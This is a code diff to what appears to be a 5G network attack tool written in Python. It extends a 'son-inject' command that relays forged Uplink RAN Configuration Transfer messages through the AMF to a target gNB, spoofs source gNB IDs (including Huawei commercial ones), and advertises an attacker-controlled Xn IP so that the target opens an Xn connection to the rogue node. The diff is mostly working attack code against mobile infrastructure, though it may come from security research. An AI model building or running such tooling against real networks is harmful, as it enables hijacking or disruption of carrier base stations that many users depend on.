@@ -428,18 +428,25 @@ def cmd_ran_config_update(gnb, a):
 def cmd_ul_ran_config_transfer(gnb, a):
     """g09: blind-relay SON/Xn config toward an attacker-named target gNB."""
     tgt_len = int(getattr(a, "target_gnb_id_len", 22))
-    src_len = int(getattr(a, "source_gnb_id_len", 22))
+    src_len = getattr(a, "source_gnb_id_len", None)
+    xn_ip = getattr(a, "xn_ip", None)
+    if xn_ip in (None, "auto"):
+        xn_ip = resolve_attacker_ip(gnb.cfg, a)
     gnb.send(B.uplink_ran_configuration_transfer(
         gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id,
-        target_gnb_id_len=tgt_len, source_gnb_id_len=src_len), wait=False)
+        target_gnb_id_len=tgt_len, source_gnb_id_len=src_len,
+        xn_ip=xn_ip), wait=False)
     src = a.source_gnb_id if a.source_gnb_id is not None else gnb.cfg.get("gnb_id")
+    src_bits = int(src_len if src_len is not None else gnb.cfg.get("gnb_id_len", 32))
     print(f"[ul-ran-config-transfer] SON inject relayed via AMF -> "
-          f"source gNB-id={int(src):#x}/{src_len}bit "
+          f"source gNB-id={int(src):#x}/{src_bits}bit "
+          f"xn-ip={xn_ip} "
           f"target gNB-id={a.target_gnb_id:#x}/{tgt_len}bit "
-          f"(blind relay; observe DownlinkRANConfigurationTransfer at the target)")
+          f"(blind relay; target should Xn-Setup toward source)")
     _save(a.evidence, {"attack": "son-inject",
                        "source_gnb_id": src,
-                       "source_gnb_id_len": src_len,
+                       "source_gnb_id_len": src_bits,
+                       "xn_ip": xn_ip,
                        "target_gnb_id": a.target_gnb_id,
                        "target_gnb_id_len": tgt_len})
 
@@ -965,9 +972,16 @@ def main():
                    help="target gNB-ID bit length (default 22 for Huawei "
                         "commercial gNB; UERANSIM gNB 1 needs 32)")
     s.add_argument("--source-gnb-id", type=lambda x: int(x, 0), default=None)
-    s.add_argument("--source-gnb-id-len", type=int, default=22,
-                   help="sourceRANNodeID gNB-ID bit length (default 22; "
-                        "does not change rogue NG Setup, still 32-bit 4660)")
+    s.add_argument("--source-gnb-id-len", type=int, default=None,
+                   help="sourceRANNodeID gNB-ID bit length "
+                        "(default: this tester's cfg gnb_id_len, 32 for 4660; "
+                        "set 22 only when spoofing a Huawei commercial source)")
+    s.add_argument("--xn-ip", default="auto",
+                   help="source Xn TNL IPv4 advertised in xnTNLConfigurationInfo "
+                        "(default: cfg xn_ip / bind_ip; target uses this to "
+                        "initiate Xn Setup toward this tester)")
+    s.add_argument("--attacker-ip", default="auto",
+                   help="alias of --xn-ip (same bind_ip resolution)")
 
     s = sub.add_parser("sweep")
     s.add_argument("--attack", required=True,
